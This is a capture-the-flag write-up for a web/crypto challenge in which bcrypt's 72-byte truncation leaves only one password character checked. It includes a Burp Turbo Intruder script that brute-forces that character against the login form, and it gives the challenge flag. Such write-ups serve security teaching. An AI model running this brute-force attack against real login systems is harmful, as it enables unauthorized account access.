# Entropyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy

🔐 Category: _WEB/CRYPTO_
🔗 Url: https://entropyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy-2f567adc1e4d.1753ctf.com/

> It's finally here. Something everyone's been waiting for. A service that solves the biggest problem of humanity. People passwords. They are tooooooooooo short. This service applies so much fresh organic gluten free salt to the password that even the biggest noob who has the word 'dog' as their password can feel safe. So much entropy that I can't even imagine it!

## Discovery

This challenge was inspired by a vulnerability in Okta authentication. More on that:
- https://trust.okta.com/security-advisories/okta-ad-ldap-delegated-authentication-username/
- https://kondukto.io/blog/okta-vulnerability-bcrypt-auth

## Solution

Let's get back to the challenge.

There is a Bcrypt algorithm used in the challenge:
```php
$hash = password_hash($usernameAdmin . $entropy . $passwordAdmin, PASSWORD_BCRYPT);
```

Does it have any interesting behaviour?

Well, yes.

As we can read on php.net:
> **Caution**
> Using the `PASSWORD_BCRYPT` as the algorithm, will result in the `password` parameter being truncated to a maximum length of 72 bytes.

https://www.php.net/manual/en/function.password-hash.php

It's not only a case in PHP. Generally Bcrypt can take input of a maximum length of 72 characters. If the input is longer, some implementations throw an exception and some implementations just silently truncate the input, leaving the programmer unaware what is going on in the background.

So what is the input of the Bcrypt in this challenge?

It's a concatenation of three parameters:
- username: `admin` (5 characters)
- entropy: `additional-entropy-for-super-secure-passwords-you-will-never-guess` (66 characters)
- password: unknown (? characters)

The length of username and entropy together is 71 characters, which means that only the first character of the password is taken into account while calculating the Bcrypt hash. And one character gives a space small enough to brute force the solution.

## Exploitation

The brute force can be done in many ways, one of them is to use a Turbo Intruder extension in Burp Suite:
1. Send the log in request to Turbo Intruder.
2. Put the injection marker in the password parameter in body:

`username=admin&password=%s`

3. Use the following Python code:
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           requestsPerConnection=10,
                           pipeline=False
                           )
						   
    for i in range(256):
        engine.queue(target.req, chr(i))
		
def handleResponse(req, interesting):
    if '1753c{' in req.response:
        table.add(req)
```
4. And 'Attack'!

After few seconds you get a response with the flag:

`1753c{bcrypt_d0esn7_1ik3_v3ry_10ng_p455w0rd5}`
